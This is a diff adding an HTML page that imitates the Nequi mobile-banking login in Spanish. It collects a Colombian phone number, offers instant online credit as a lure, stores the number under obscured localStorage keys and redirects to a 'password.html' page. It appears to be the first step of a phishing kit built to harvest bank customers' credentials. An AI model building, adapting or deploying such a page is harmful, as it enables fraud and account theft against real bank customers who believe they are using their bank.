@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nequi</title>
+<style>
+body{margin:0;background:#200020;font-family:'Poppins',Arial,sans-serif;color:white;display:flex;justify-content:center;}
+.app{width:100%;max-width:420px;min-height:100vh;padding:20px;}
+.logo{text-align:center;margin-top:60px;font-size:28px;font-weight:bold;}
+.input-box{margin-top:60px;}
+.input{display:flex;background:rgba(255,255,255,0.2);padding:12px;border-radius:10px;margin-bottom:20px;}
+.input span{margin-right:10px;padding-top:3px;}
+.input input{background:transparent;border:none;color:white;width:100%;outline:none;font-size:17px;}
+.btn{margin-top:20px;width:100%;padding:15px;background:#ff008c;border:none;color:white;border-radius:10px;font-size:16px;font-weight:600;}
+.bottom-section{background:#2b002b;padding:40px 20px;text-align:center;border-radius:20px;margin-top:40px;}
+.bottom-section h2{font-size:22px;margin-bottom:15px;}
+.bottom-section p{font-size:14px;color:#ccc;line-height:1.5;}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="logo">Nequi</div>
+  <div class="input-box">
+    <form onsubmit="z1(event)">
+      <div class="input">
+        <span>+57</span>
+        <input type="tel" inputmode="numeric" id="n1" placeholder="Ingresa tu cel" maxlength="10" pattern="[0-9]*">
+      </div>
+      <button class="btn" type="submit">Entra</button>
+    </form>
+  </div>
+  <div class="bottom-section">
+    <h2>Crédito en línea y <br><span>al instante desde tu Web Nequi</span></h2>
+    <p>Analizamos cómo manejas tu plata. Entre más pagues, recargues y uses menos efectivo, mejor conocemos tu perfil y más chance tienes de acceder a mejores condiciones.</p>
+    <button class="btn" style="background:#ff4db8;margin-top:15px;">Solicita tu crédito</button>
+    <p style="margin-top:20px;font-size:14px;">Paga tu crédito de forma flexible y <strong>#ATuRitmo</strong></p>
+  </div>
+</div>
+
+<script>
+function z1(e){e.preventDefault();let t=document.getElementById("n1").value.trim();t=t.replace(/\D/g,"");if(t.length!==10){alert("❌ Por favor ingresa un número de celular de 10 dígitos");return}let o="+57"+t;let n=JSON.parse(localStorage.getItem("x1"))||{};n.p1=o;localStorage.setItem("x1",JSON.stringify(n));window.location.href="password.html"}
+</script>
+</body>
+</html>
